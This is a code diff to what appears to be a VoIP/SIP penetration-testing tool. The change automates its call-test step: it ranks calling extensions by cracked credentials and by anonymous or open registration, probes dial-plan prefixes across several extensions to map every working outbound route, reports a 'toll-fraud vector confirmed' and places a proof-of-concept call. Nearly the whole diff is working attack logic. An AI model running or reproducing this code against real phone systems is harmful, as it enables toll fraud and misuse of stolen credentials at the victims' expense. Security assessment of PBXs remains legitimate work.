@@ -938,27 +938,27 @@ def main() -> int:
         if args.call_test:
             call_from = args.call_from
             username = password = None
-            if hr["credentials_found"]:
-                chosen = hr["credentials_found"][0]
-                call_from = call_from or chosen["extension"]
-                username = chosen["username"]
-                password = chosen["password"]
-                _info(f"Using cracked credentials: {username}/{password}", col)
-            elif hr["extensions"]:
-                openish = [e for e in hr["extensions"]
-                           if e.get("anonymous_invite") or e.get("open_register")]
-                if openish:
-                    call_from = call_from or openish[0]["extension"]
-                    _info(f"Using open extension {call_from} for anonymous INVITE.", col)
 
-                # --auto: also try toll-fraud PoC if anonymous INVITE found
-                if args.auto and openish:
-                    _info(
-                        "AUTO mode: anonymous INVITE accepted — toll-fraud vector confirmed.",
-                        col,
-                    )
+            # Build ordered candidate list: cracked creds first, then anonymous/open exts
+            _call_candidates: list[tuple[str, str | None, str | None]] = []
+            for _c in hr["credentials_found"]:
+                _call_candidates.append((_c["extension"], _c["username"], _c["password"]))
+            if hr["extensions"]:
+                _openish = [e for e in hr["extensions"]
+                            if e.get("anonymous_invite") or e.get("open_register")]
+                for _e in _openish:
+                    _call_candidates.append((_e["extension"], None, None))
+                if _openish and args.auto:
+                    _info("AUTO mode: anonymous INVITE accepted — toll-fraud vector confirmed.", col)
 
-            call_from = call_from or "1000"
+            if _call_candidates:
+                _best = _call_candidates[0]
+                call_from = call_from or _best[0]
+                username, password = _best[1], _best[2]
+                _auth_label = f"{username}/{password}" if username else "anonymous"
+                _info(f"Primary calling extension: {col.BOLD}{call_from}{col.RESET}  [{_auth_label}]", col)
+            else:
+                call_from = call_from or "1000"
 
             # --call-to-auto: override call_from with first AMI-discovered extension
             if args.call_to_auto:
@@ -974,23 +974,72 @@ def main() -> int:
                 else:
                     _warn("--call-to-auto: no AMI-discovered extensions available; using default.", col)
 
-            # Dial-plan prefix discovery
+            # Dial-plan prefix discovery — tries every candidate extension until a
+            # prefix is found; in --auto mode also maps ALL working prefixes exhaustively
             effective_call_to = args.call_to
+            all_working_prefixes: list[tuple[str, str, str]] = []  # (prefix, dest, from_ext)
+
             if args.discover_prefix:
-                _info(f"Discovering dial-plan prefix for {args.call_to}...", col)
-                _jitter_sleep(args.jitter)
-                found_prefix, effective_call_to = call.discover_dialplan_prefix(
-                    h.ip, args.call_to, call_from,
-                    port=args.port, username=username, password=password,
-                    timeout=args.timeout, traffic_log=traffic_log,
-                    source_ip=args.source_ip,
-                    source_port_range=source_port_range,
+                _platform_prefixes = call.prefixes_for_fingerprint(h.fingerprint)
+                _info(
+                    f"Prefix discovery: probing {len(_platform_prefixes)} prefixes "
+                    f"({h.fingerprint} order) across "
+                    f"{min(len(_call_candidates) or 1, 3)} extension(s)...",
+                    col,
                 )
-                if found_prefix is not None:
-                    prefix_label = repr(found_prefix) if found_prefix else "'(none)'"
-                    _ok(f"Dial-plan prefix: {prefix_label} → calling as {col.BOLD}{effective_call_to}{col.RESET}", col)
+
+                _found_prefix: str | None = None
+                _probe_exts = _call_candidates[:3] if _call_candidates else [(call_from, username, password)]
+
+                for _ext, _uname, _pwd in _probe_exts:
+                    _jitter_sleep(args.jitter)
+
+                    if args.auto:
+                        # Exhaustive: find every working prefix from this extension
+                        _hits = call.discover_all_prefixes(
+                            h.ip, args.call_to, _ext,
+                            port=args.port, username=_uname, password=_pwd,
+                            timeout=args.timeout, traffic_log=traffic_log,
+                            source_ip=args.source_ip,
+                            source_port_range=source_port_range,
+                            prefixes=_platform_prefixes,
+                        )
+                        for _pfx, _dest in _hits:
+                            all_working_prefixes.append((_pfx, _dest, _ext))
+                        if _hits and _found_prefix is None:
+                            _found_prefix, effective_call_to = _hits[0]
+                            call_from, username, password = _ext, _uname, _pwd
+                    else:
+                        # Fast: stop at first working prefix
+                        _found_prefix, effective_call_to = call.discover_dialplan_prefix(
+                            h.ip, args.call_to, _ext,
+                            port=args.port, username=_uname, password=_pwd,
+                            timeout=args.timeout, traffic_log=traffic_log,
+                            source_ip=args.source_ip,
+                            source_port_range=source_port_range,
+                            prefixes=_platform_prefixes,
+                        )
+                        if _found_prefix is not None:
+                            call_from, username, password = _ext, _uname, _pwd
+                            break
+
+                if _found_prefix is not None:
+                    _prefix_label = repr(_found_prefix) if _found_prefix else "'(none/direct)'"
+                    _ok(f"Dial-plan prefix: {_prefix_label} → {col.BOLD}{effective_call_to}{col.RESET}  "
+                        f"via ext {call_from}", col)
                 else:
                     _warn(f"No prefix produced a provisional response — using bare {effective_call_to}", col)
+
+                if len(all_working_prefixes) > 1:
+                    _info(f"All working prefixes ({len(all_working_prefixes)} found):", col)
+                    for _pfx, _dest, _fext in all_working_prefixes:
+                        _pfx_disp = repr(_pfx) if _pfx else "'(direct)'"
+                        _ok(f"  prefix {_pfx_disp:<12} → {_dest}  from {_fext}", col)
+                    _finding("high",
+                             f"Multiple outbound prefixes accepted — dialplan not restricted "
+                             f"({len(all_working_prefixes)} routes: "
+                             f"{', '.join(repr(p) for p, _, _ in all_working_prefixes)})",
+                             col)
 
             _info(f"Placing PoC call: {col.BOLD}{call_from}{col.RESET} → "
                   f"{col.BOLD}{effective_call_to}{col.RESET}  "
@@ -1021,6 +1070,10 @@ def main() -> int:
                 "trace": result.sip_trace,
                 "srtp_state": result.srtp_state,
                 "dtmf_digits_sent": result.dtmf_digits_sent,
+                "working_prefixes": [
+                    {"prefix": p, "destination": d, "from_ext": e}
+                    for p, d, e in all_working_prefixes
+                ],
             }
 
             if result.success:
